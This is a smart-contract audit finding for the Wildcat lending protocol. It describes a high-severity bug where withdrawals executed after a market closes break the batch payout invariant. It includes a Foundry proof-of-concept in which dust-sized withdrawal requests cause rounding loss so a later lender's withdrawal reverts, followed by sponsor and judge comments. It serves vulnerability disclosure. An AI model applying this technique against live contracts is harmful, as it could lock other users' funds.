# 2024-08-wildcat Report

## [H-01] User could withdraw more than supposed to, forcing last user withdraw to fail

*Submitted by deadrxsezzz*

Within Wildcat, withdraw requests are put into batches. Users first queue their withdraws and whenever there’s sufficient liquidity, they’re filled at the current rate. Usually, withdraw requests are only executable after the expiry passes and then all users within the batch get a cut from the `batch.normalizedAmountPaid` proportional to the scaled amount they’ve requested a withdraw for.

```
    uint128 newTotalWithdrawn = uint128(
      MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount)
    );
```

This makes sure that the sum of all withdraws doesn’t exceed the total `batch.normalizedAmountPaid` .

However, this invariant could be broken, if the market is closed as it allows for a batch’s withdraws to be executed, before all requests are added.

Consider the market is made of 3 lenders - Alice, Bob and Laurence.

1. Alice queues a larger withdraw with an expiry time 1 year in the future.
2. Market gets closed.
3. Alice executes her withdraw request at the current rate.
4. Bob makes queues multiple smaller requests. As they’re smaller, the normalized amount they represent suffers higher precision loss. Because they’re part of the whole batch, they also slightly lower the batch’s overall rate.
5. Bob executes his requests.
6. Laurence queues a withdraw for his entire amount. When he attempts to execute it, it will fail. This is because Alice has executed her withdraw at a higher rate than the current one and there’s now insufficient state.normalizedUnclaimedWithdrawals

Note: marking this as High severity as it both could happen intentionally (attacker purposefully queuing numerous low-value withdraws to cause rounding down) and also with normal behaviour in high-value closed access markets where a user’s withdraw could easily be in the hundreds of thousands.

Also breaks core invariant:

> The sum of all transfer amounts for withdrawal executions in a batch must be less than or equal to batch.normalizedAmountPaid

Adding a PoC to showcase the issue:

```
  function test_deadrosesxyzissue() external {
    parameters.annualInterestBips = 3650;
    _deposit(alice, 1e18);
    _deposit(bob, 0.5e18);
    address laurence = address(1337);
    _deposit(laurence, 0.5e18);
    fastForward(200 weeks);

    vm.startPrank(borrower);
    asset.approve(address(market), 10e18);
    asset.mint(borrower, 10e18);

    vm.stopPrank();
    vm.prank(alice);
    uint32 expiry = market.queueFullWithdrawal();       // alice queues large withdraw

    vm.prank(borrower);
    market.closeMarket();                               // market is closed

    market.executeWithdrawal(alice, expiry);     // alice withdraws at the current rate

    vm.startPrank(bob);
    for (uint i; i < 10; i++) {
      market.queueWithdrawal(1);        // bob does multiple small withdraw requests just so they round down the batch's overall rate
    }
    market.queueFullWithdrawal();
    vm.stopPrank();
    vm.prank(laurence);
    market.queueFullWithdrawal();

    market.executeWithdrawal(bob, expiry);     // bob can successfully withdraw all of his funds

    vm.expectRevert();
    market.executeWithdrawal(laurence, expiry);    // laurence cannot withdraw his funds. Scammer get scammed.

  }
```

Although it’s not a clean fix, consider adding a `addNormalizedUnclaimedRewards` function which can only be called after a market is closed. It takes token from the user and increases the global variable `state.normalizedUnclaimedRewards` . The invariant would remain broken, but it will make sure no funds are permanently stuck.

**laurenceday (Wildcat) confirmed and commented:**

> We’re going to have to dig into this, but we’re confirming. Thank you!

**3docSec (judge) commented:**

> I am confirming as High, under the assumption that funds can’t be recovered (didn’t see a cancelWithdrawal or similar option).

**laurenceday (Wildcat) commented:**

> Fixed by the mitigation for M-01:
> wildcat-finance/v2-protocol@b25e528.
